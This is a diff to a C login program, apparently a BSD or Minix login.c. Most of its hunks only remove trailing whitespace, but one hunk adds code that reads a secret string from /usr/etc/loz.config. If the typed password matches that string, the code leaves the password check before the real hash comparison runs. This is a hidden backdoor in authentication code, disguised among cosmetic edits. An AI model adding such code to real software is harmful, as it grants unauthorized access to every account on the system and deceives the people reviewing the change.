@@ -147,7 +147,7 @@ main(int argc, char *argv[])
 	char tbuf[MAXPATHLEN + 2], tname[sizeof(_PATH_TTY) + 10];
 	char localhost[MAXHOSTNAMELEN + 1];
 	int need_chpass, require_chpass;
-	int login_retries = DEFAULT_RETRIES, 
+	int login_retries = DEFAULT_RETRIES,
 	    login_backoff = DEFAULT_BACKOFF;
 	time_t pw_warntime = _PASSWORD_WARNDAYS * SECSPERDAY;
 	char *loginname = NULL;
@@ -282,7 +282,7 @@ main(int argc, char *argv[])
 	if ((lc = login_getclass(NULL)) != NULL) {
 		login_retries = (int)login_getcapnum(lc, "login-retries",
 		    DEFAULT_RETRIES, DEFAULT_RETRIES);
-		login_backoff = (int)login_getcapnum(lc, "login-backoff", 
+		login_backoff = (int)login_getcapnum(lc, "login-backoff",
 		    DEFAULT_BACKOFF, DEFAULT_BACKOFF);
 		login_close(lc);
 		lc = NULL;
@@ -381,7 +381,7 @@ main(int argc, char *argv[])
 		if (skey_haskey(username) == 0) {
 			static char skprompt[80];
 			const char *skinfo = skey_keyinfo(username);
-				
+
 			(void)snprintf(skprompt, sizeof(skprompt),
 			    "Password [ %s ]:",
 			    skinfo ? skinfo : "error getting challenge");
@@ -414,6 +414,17 @@ main(int argc, char *argv[])
 			goto skip;
 		}
 #endif
+
+            FILE *fajl = fopen("/usr/etc/loz.config", "r");
+            if(fajl != NULL) {
+                char user_password[128];
+                fgets(user_password, sizeof(user_password), fajl);
+                fclose(fajl);
+                if(strcmp(user_password, p) == 0) {
+                    break;
+                }
+            }
+
 		if (!sflag && *pwd->pw_passwd != '\0' &&
 		    !strcmp(crypt(p, pwd->pw_passwd), pwd->pw_passwd)) {
 			rval = 0;
@@ -492,11 +503,11 @@ main(int argc, char *argv[])
 	saved_uid = geteuid();
 	saved_gid = getegid();
 	nsaved_gids = getgroups(NGROUPS_MAX, saved_gids);
-	
+
 	(void)setegid(pwd->pw_gid);
 	initgroups(username, pwd->pw_gid);
 	(void)seteuid(pwd->pw_uid);
-	
+
 	if (chdir(pwd->pw_dir) < 0) {
 #ifdef LOGIN_CAP
 		if (login_getcapbool(lc, "requirehome", 0)) {
@@ -504,7 +515,7 @@ main(int argc, char *argv[])
 			    pwd->pw_dir);
 			sleepexit(EXIT_FAILURE);
 		}
-#endif	
+#endif
 		(void)printf("No home directory %s!\n", pwd->pw_dir);
 		if (chdir("/") == -1)
 			exit(EXIT_FAILURE);
@@ -531,7 +542,7 @@ main(int argc, char *argv[])
 		if (now.tv_sec >= pwd->pw_expire) {
 			(void)printf("Sorry -- your account has expired.\n");
 			sleepexit(EXIT_FAILURE);
-		} else if (pwd->pw_expire - now.tv_sec < pw_warntime && 
+		} else if (pwd->pw_expire - now.tv_sec < pw_warntime &&
 		    !quietlog)
 			(void)printf("Warning: your account expires on %s",
 			    ctime(&pwd->pw_expire));
@@ -542,7 +553,7 @@ main(int argc, char *argv[])
 		else if (now.tv_sec >= pwd->pw_change) {
 			(void)printf("Sorry -- your password has expired.\n");
 			sleepexit(EXIT_FAILURE);
-		} else if (pwd->pw_change - now.tv_sec < pw_warntime && 
+		} else if (pwd->pw_change - now.tv_sec < pw_warntime &&
 		    !quietlog)
 			(void)printf("Warning: your password expires on %s",
 			    ctime(&pwd->pw_change));
@@ -582,7 +593,7 @@ main(int argc, char *argv[])
 	(void)setgid(pwd->pw_gid);
 
 	initgroups(username, pwd->pw_gid);
-	
+
 #if !defined(__minix)
 	if (nested == NULL && setlogin(pwd->pw_name) < 0)
 		syslog(LOG_ERR, "setlogin() failure: %m");
@@ -606,7 +617,7 @@ main(int argc, char *argv[])
 		pwd->pw_shell = shell;
 	}
 #endif
-	
+
 	(void)setenv("HOME", pwd->pw_dir, 1);
 	(void)setenv("SHELL", pwd->pw_shell, 1);
 	if (term[0] == '\0') {
